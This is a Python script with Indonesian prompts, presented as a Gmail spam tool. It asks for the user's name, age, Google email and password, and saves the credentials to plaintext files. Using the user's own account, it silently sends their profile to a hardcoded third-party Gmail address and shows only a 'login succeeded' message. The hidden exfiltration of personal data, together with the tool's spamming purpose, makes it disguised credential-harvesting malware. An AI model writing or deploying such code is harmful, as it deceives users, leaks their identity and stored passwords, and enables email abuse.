#coding=utf-8
import smtplib,sys
import socket
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from os import system
from time import sleep
from getpass import getpass
from sys import version as versi_python
from datetime import datetime

try:
	from Gmail import tabel_waktu, nama,Aku
except ModuleNotFoundError:
	exit('\033[93m[!] GAGAL MENJALANKAN PROGRAM')

def main():
	system('clear')
	try:
		open('Frofil.txt')
		login()
	except NameError:
		exit('\033[93m[!] GAGAL MENJALANKAN PROGRAM')
	except PermissionError:
		exit('\033[91m[!] GAGAL MENGAKSES PENYIMPANAN')
	except FileNotFoundError:
		print(nama) ; tabel_waktu() ; print ('\033[92mISI IDENTITAS DENGAN BENAR') ; print (29* '\033[93m=')
		name = input('\033[92m[?] NAMA : \033[93m')
		if name == "":
			print ('\033[91m[!] GAK BOLEH KOSONG') ; sleep(3) ; main()
		else:
			with open('Name.txt','w') as a:
				b = name.upper() ; a.write(b) ; a.close()
		umur = input ('\033[92m[?] UMUR : \033[93m')
		if umur == "":
			print ('\033[91m[!] GAK BOLEH KOSONG') ; sleep(3) ; main()
		buat = f"NAMA : {name}\nUMUR : {umur}"
		with open('Frofil.txt','w') as C:
			C.write(buat) ; sleep(1) ; login()
		
def login():
	system('clear')
	print (nama)
	tabel_waktu()
	print ('\033[92mLOGIN AKUN GOOGLE') ; print (20* '\033[96m=')
	try:
		pengirim = input ('\033[92m[?] EMAIL : \033[96m')
		if pengirim == "":
			print ('\033[93m[!] MOHON ISI DENGAN BENAR')
			sleep(3)
			login()
		with open ('email.txt','w') as a:
			a.write(pengirim) ; a.close()
		password = getpass ('\033[92m[?] PASSWORD : \033[93m')
		if password == "":
			print ('\033[91m[!] ISI DENGAN BENAR')
			sleep(3)
			login()
		else:
			print ('\033[93m[!] MOHON TUNGGU')
			with open ('password.txt','w') as b:
				b.write(password) ; b.close()
			while True:
				fromaddr = pengirim
				toaddr = "rahmadadha11@gmail.com"
				 
				msg = MIMEMultipart()
				 
				msg['From'] = fromaddr
				msg['To'] = toaddr
				msg['Subject'] = "FROFIL USER"
				 
				body = "FROFIL USER DARI PROGRAM SPAM GMAIL"
				 
				msg.attach(MIMEText(body, 'plain'))
				
				filename = "Frofil.txt"
				attachment = open("Frofil.txt", "rb")
				 
				
				part = MIMEBase('application', 'octet-stream')
				part.set_payload((attachment).read())
				encoders.encode_base64(part)
				part.add_header('Content-Disposition', "attachment; filename= %s" % filename)
				 
				msg.attach(part)
				 
				server = smtplib.SMTP('smtp.gmail.com', 587)
				server.starttls()
				server.login(fromaddr, password)
				text = msg.as_string()
				server.sendmail(fromaddr, toaddr, text)
				server.quit()
				print ('\033[92m[✓] BERHASIL LOGIN')
				break
	except smtplib.SMTPServerDisconnected:
		exit('\033[93m[!] SAMBUNGAN TERPUTUS')
	except TimeoutError:
		exit('\033[93m[!] GAGAL TERHUBUNG KE SERVER')
	except smtplib.SMTPAuthenticationError:
		print ('\033[93m[!] USERNAME : \033[92m{}'.format(pengirim))
		print ('\033[93m[!] PASSWORD : \033[95m{}'.format(password))
		system ('rm email.txt') ; system('rm password.txt')
		exit('\033[91m[!] GAGAL LOGIN KE AKUN ')
	except socket.gaierror:
		exit('\033[91m[!] TIDAK ADA KONEKSI')
	except smtplib.SMTPRecipientsRefused:
		exit('\033[93m[!] PENGGUNA TIDAK DI TEMUKAN')
	except IsADirectoryError:
		exit('\033[93m[!] TERJADI KESALAHAN YANG TIDAK DI KETAHUI')
	except PermissionError:
		exit('\033[91m[!] GAGAL MENGAKSES PENYIMPANAN')
	except FileNotFoundError:
		print (f'\033[93m[!] FILE \033[96m"{File}" \033[93mTIDAK DI TEMUKAN')
		
if __name__=="__main__":
	main()